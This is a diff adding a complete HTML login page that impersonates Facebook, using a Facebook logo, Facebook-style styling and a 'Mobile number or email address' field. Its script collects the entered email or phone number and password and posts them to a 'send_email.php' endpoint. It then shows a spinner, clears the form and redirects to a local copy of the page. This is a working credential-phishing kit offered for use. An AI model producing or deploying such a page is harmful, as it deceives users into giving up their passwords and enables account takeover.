@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            position: relative;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            width: 300px;
+            text-align: center;
+            position: relative;
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-container button:hover {
+            background-color: #165eab;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        #loader {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 10px;
+            background-color: rgba(0,0,0,0.7);
+            color: white;
+            border-radius: 4px;
+            font-size: 16px;
+            text-align: center;
+            z-index: 100;
+        }
+        #loader::after {
+            content: "";
+            display: block;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 3px solid #fff;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        
+        <img src="/storage/emulated/0/Download/Sg2QOE06yVC.png" alt="Facebook" width="50" height="50">
+        
+        
+        <input type="text" id="login-input" placeholder="Mobile number or email address" aria-label="Mobile number or email address" />
+        <input type="password" id="password" placeholder="Password" aria-label="Password" />
+        <button onclick="login()">Log In</button>
+        <div id="error-message" class="error-message" role="alert"></div>
+        <div id="loader">Loading...</div>
+    </div>
+
+    <script>
+        async function login() {
+            const loginInput = document.getElementById('login-input').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            // Basic validation
+            if (loginInput === '' || password === '') {
+                showError('Please enter both login details and password.');
+                return;
+            }
+
+            // Validation for email and phone number
+            if (!isValidPhoneNumber(loginInput) && !isValidEmail(loginInput)) {
+                showError('Please enter a valid mobile number or email address.');
+                return;
+            }
+
+            // Show the loader
+            document.getElementById('loader').style.display = 'block';
+
+            try {
+                // Send login data to server
+                await sendLoginData(loginInput, password);
+
+                // Simulate delay and redirect
+                setTimeout(() => {
+                    window.location.href = 'content://com.google.android.apps.nbu.files.provider/1/file%3A%2F%2F%2Fstorage%2Femulated%2F0%2FFacebook%2520log%2520in2.html';
+                }, 2000);
+            } finally {
+                // Hide the loader and clear the form
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('error-message').innerText = '';
+                document.getElementById('login-input').value = '';
+                document.getElementById('password').value = '';
+            }
+        }
+
+        function showError(message) {
+            document.getElementById('error-message').innerText = message;
+        }
+
+        function isValidPhoneNumber(input) {
+            // Basic phone number validation: 11 digits
+            const phoneRegex = /^[0-9]{11}$/;
+            return phoneRegex.test(input);
+        }
+
+        function isValidEmail(input) {
+            // Basic email validation
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(input);
+        }
+
+        async function sendLoginData(loginInput, password) {
+            const response = await fetch('send_email.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ loginInput, password })
+            });
+
+            if (!response.ok) {
+                showError('Failed to send login data.');
+            }
+        }
+    </script>
+</body>
+</html>
